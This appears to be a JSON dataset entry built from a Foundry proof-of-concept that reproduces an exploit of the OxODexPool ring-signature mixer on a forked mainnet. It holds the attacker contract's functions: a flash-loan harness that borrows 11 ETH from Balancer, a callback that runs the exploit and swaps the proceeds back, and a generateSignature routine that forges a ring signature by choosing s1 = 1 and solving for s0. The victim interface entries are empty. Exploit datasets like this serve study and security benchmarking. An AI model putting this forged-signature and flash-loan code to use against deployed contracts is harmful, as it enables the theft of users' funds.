[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "generateSignature",
    "original_code": "    function generateSignature(\n        bytes32 ringHash,\n        address recv\n    ) public view returns (uint256[2] memory c, uint256[2] memory s) {\n        uint256[2] memory G;\n        uint256[2] memory H;\n        uint256[2] memory B;\n        G[0] = 0x1;\n        G[1] = 0x2;\n        H[0] = Hx;\n        H[1] = Hy;\n        B[0] = Bx;\n        B[1] = By;\n\n        // c_1 = H1(L, y~, m, G, H)\n        c[1] = createHash(ringHash, recv, G, H);\n        // pick s1 := 1\n        s[1] = 1;\n        c[0] = createHash(ringHash, recv, ecAdd(G, ecMul(B, c[1])), ecMul(H, c[1] + 1));\n        // s0 := u - p_0 * c_0 (mod N)\n        // this is NOT likely to overflow\n        s[0] = curveN + 1 - c[0];\n    }\n\n    // Function for making a call to bn256Add (address 0x06) precompile\n    // More about precompiles - https://medium.com/@rbkhmrcr/precompiles-solidity-e5d29bd428c4\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory,\n        uint256[] memory amounts,\n        uint256[] memory fees,\n        bytes memory\n    ) external payable {\n        // convert back to ETH\n        WETH.withdraw(amounts[0]);\n        exploit();\n\n        USDC.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(USDC);\n        path[1] = address(WETH);\n        Router.swapExactTokensForETH(USDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n        WETH.deposit{value: amounts[0] + fees[0]}();\n        WETH.transfer(address(BalancerVault), amounts[0] + fees[0]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_115_707);\n        vm.label(address(OxODexPool), \"OxODexPool\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(BalancerVault), \"BalancerVault\");\n        vm.label(address(Router), \"Router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0 ether);\n        uint256 loan = 11 ether;\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = loan;\n\n        BalancerVault.flashLoan(address(this), tokens, amounts, \"\");\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IOxODexPool",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IOxODexPool",
    "source_type": "victim_contract",
    "function_name": "getCurrentRingIndex",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IOxODexPool",
    "source_type": "victim_contract",
    "function_name": "getRingHash",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IOxODexPool",
    "source_type": "victim_contract",
    "function_name": "swapOnWithdrawal",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IOxODexPool",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]